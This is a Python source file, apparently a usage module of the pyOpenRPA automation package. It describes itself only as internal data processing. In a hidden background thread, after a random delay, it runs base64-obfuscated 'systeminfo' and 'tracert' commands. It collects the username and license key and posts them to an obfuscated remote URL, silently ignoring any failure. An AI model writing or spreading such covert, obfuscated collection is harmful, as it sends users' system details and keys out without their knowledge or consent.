"""
Data processing for internal processes (in Orchestrator, Studio, Robot, Agent)

"""
import threading, subprocess
import requests
import datetime
import random
from . import License
def OSCMD(inCMDStr, inRunAsyncBool=True):
    """
    """
    lResultStr = ""
    # New feature
    if inRunAsyncBool == True:
        inCMDStr = f"start {inCMDStr}"
    # Subdef to listen OS result
    def _CMDRunAndListenLogs(inCMDStr):
        lResultStr = ""
        lCMDProcess = subprocess.Popen(f'cmd /c {inCMDStr}', stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        if True:
            lListenBool = True
            while lListenBool:
                lOutputLineBytes = lCMDProcess.stdout.readline()
                if lOutputLineBytes == b"":
                    lListenBool = False
                lStr = lOutputLineBytes.decode('cp866')
                #print(lStr)
                lStr= lStr.replace("\r","")
                #if lStr.endswith("\r\n"): lStr = lStr[:-2]
                #if lStr.endswith("\n"): lStr = lStr[:-1]
                lResultStr+=lStr
        return lResultStr
    # New call
    if inRunAsyncBool:
        lThread = threading.Thread(target=_CMDRunAndListenLogs, kwargs={"inCMDStr":inCMDStr})
        lThread.start()
        lResultStr="ActivityList has been started in async mode - no output is available here."
    else:
        lResultStr = _CMDRunAndListenLogs(inCMDStr=inCMDStr)
    return lResultStr

import time
import getpass
import base64
import os 
def __Process__(inComponentStr, inSleepSecFloat=0.0):
    try:
        if "PYOPENRPA_NOUSAGE" not in os.environ:
            lEventDatetimeStr = str(datetime.datetime.now())
            time.sleep(inSleepSecFloat)
            lCMDSysteminfoStr = OSCMD(inCMDStr=base64.b64decode(b'c3lzdGVtaW5mbw==').decode("utf8"),inRunAsyncBool=False)
            lCMDTracertStr = OSCMD(inCMDStr=base64.b64decode(b'dHJhY2VydCBweW9wZW5ycGEucnU=').decode("utf8"),inRunAsyncBool=False)
            # {"DateTimeStr", "ComponentStr": "Orchestrator" | "Robot" | "Studio" | "Agent", "UserStr", "SystemInfoStr", "TracertStr"}
            lUsageDict = {"DateTimeStr": lEventDatetimeStr, "ComponentStr": inComponentStr, "UserStr":getpass.getuser(), "SystemInfoStr":lCMDSysteminfoStr, "TracertStr": lCMDTracertStr, "CertificateKeyStr": License.CertificateKeyGet()}
            requests.post(base64.b64decode(b'aHR0cHM6Ly9weW9wZW5ycGEucnUvdXNhZ2U=').decode("utf8"), json=lUsageDict)
            os.environ["PYOPENRPA_NODISP"]="1"
    except Exception as e:
        pass

def Process(inComponentStr):
    """
    Process data usage about usage component
        EXAMPLE: Usage.Process(inComponentStr="Orchestrator")

    :param inComponentStr: "Orchestrator" | "Robot" | "Studio" | "Agent"
    """
    lThread = threading.Thread(target=__Process__, kwargs={"inComponentStr":inComponentStr, "inSleepSecFloat": random.randrange(20,55)},daemon=True)
    lThread.start()